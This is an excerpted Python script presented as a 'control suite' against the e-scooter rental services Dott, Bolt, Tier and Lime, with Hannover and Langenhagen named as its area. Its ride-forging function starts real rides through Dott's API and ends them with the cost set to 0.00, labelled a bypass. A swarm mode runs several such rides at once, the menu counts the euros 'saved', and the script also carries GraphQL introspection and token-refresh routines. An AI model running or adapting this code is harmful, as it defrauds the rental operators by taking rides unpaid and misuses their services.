#!/usr/bin/env python3
"""
DOTT LANGENHAGEN 30853 - ULTIMATE CONTROL SUITE
Merges Lgh.py, Lgh2.py, Lgh3.py, Lgh4.py + Advanced Control Features.

Features:
- Hybrid Radar (Public GBFS + Authenticated API)
- Multi-Provider: Dott, Bolt, Tier, Lime
- GPS Radar with Haversine Filtering
- Ride Forging (Sim & Real Modes)
- Cost Bypass (End Ride with 0.00)
- BLE Scanner (Bleak)
- GraphQL Introspection
- JWT Inspector & Token Manager
- Swarm Mode (Multi-threaded)
...
GRAPHQL_BASE = "https://api.ridedott.com/graphql"
BOLT_API = "https://fleet-api.bolt.eu/v1/fleets/self-service/vehicles"
TIER_API = "https://public-api.tier-services.io/v1/vehicles"
LIME_API = "https://web-api.lime.bike/api/v1/search"
...
HANNOVER_GPS = (52.3759, 9.7320)
LANGENHAGEN_CENTER_GPS = (52.4600, 9.6900)

CITIES = ["hannover", "berlin", "muenchen", "paris", "london"]
...
def banner():
    ...
    print(f"{Fore.MAGENTA}       DOTT LANGENHAGEN 30853 - ULTIMATE CONTROL SUITE")
    print(f"{Fore.CYAN}{'='*70}")
    print(f"{Fore.WHITE}  Target: com.ridedott.rider | Langenhagen 30853")
...
class LangenhagenEngine:
    ...
    def setup_session(self):
        if self.token:
            ...
            try:
                r = self.session.get(f"{API_BASE}/api/v2/profile", timeout=5)
    ...
    def get_nearby_scooters(self):
        """Hybrid Radar: Public GBFS + Bolt/Tier/Lime Fallback"""
        ...
        # 2. Bolt (Public-ish)
        try:
            r = requests.get(BOLT_API, params={'lat': self.lat, 'lng': self.lon, 'count': 50}, timeout=10)
            if r.status_code == 200:
        ...
        # 3. Tier (Public)
        try:
            r = requests.get(TIER_API, params={'lat': self.lat, 'lng': self.lon, 'radius': int(self.radius_km*1000)}, timeout=10)
            if r.status_code == 200:
    ...
    def print_radar(self, vehicles):
        ...
        for i, v in enumerate(vehicles[:15], 1):
            ...
            print(f"{i:2d} {dist_c}{v['dist']:6.0f}m {bat_c}{v['battery']:3d}% {v['provider'].upper()}")
        print(f"{'='*50}")
    ...
    def forge_ride_real(self, vehicle):
        ...
        # 1. Create Order
        try:
            r = self.session.post(f"{API_BASE}/api/v2/rides", json={
        ...
        # 2. Start Ride
        try:
            self.session.post(f"{API_BASE}/api/v2/rides/{ride_id}/start", json={"photo": photo}, timeout=10)
            log("✅ Ride Started", "OK")
        except:
            pass

        # 3. Simulate Duration (or real wait)
        time.sleep(5) # Shorter wait for demo

        # 4. End Ride with Bypass
        try:
            self.session.put(f"{API_BASE}/api/v2/rides/{ride_id}/end", json={
                "lat": self.lat,
                "lon": self.lon,
                "distance_m": random.randint(100, 500),
                "duration_s": 30,
                "total_cost": 0.0 # Bypass!
            }, timeout=10)
    ...
    def graphql_introspection(self):
        ...
        """
        try:
            r = self.session.post(GRAPHQL_BASE, json={"query": query}, timeout=10)
            if r.status_code == 200:
                data = r.json()
    ...
    def refresh_token(self):
        ...
        if os.path.exists(REFRESH_TOKEN_FILE):
            with open(REFRESH_TOKEN_FILE, 'r') as f:
                rt = f.read().strip()
            try:
                r = requests.post(f"{API_BASE}/api/v2/auth/refresh", json={
    ...
    def swarm_rides(self, count=3, mode=None):
        ...
        def run_ride(v):
            if target_mode == 'sim':
                self.forge_ride_sim(v, 10) # Short sim for swarm
            else:
    ...
    def run_menu(self):
        while True:
            ...
            print(f"{Fore.YELLOW} 10. Refresh Token{Style.RESET_ALL}")
            ...
            if choice == '1':
                ...
                log(f"Stats: {self.stats['rides']} rides, €{self.stats['savings']:.2f} saved", "INFO")
                log("Exiting...", "INFO")
                break
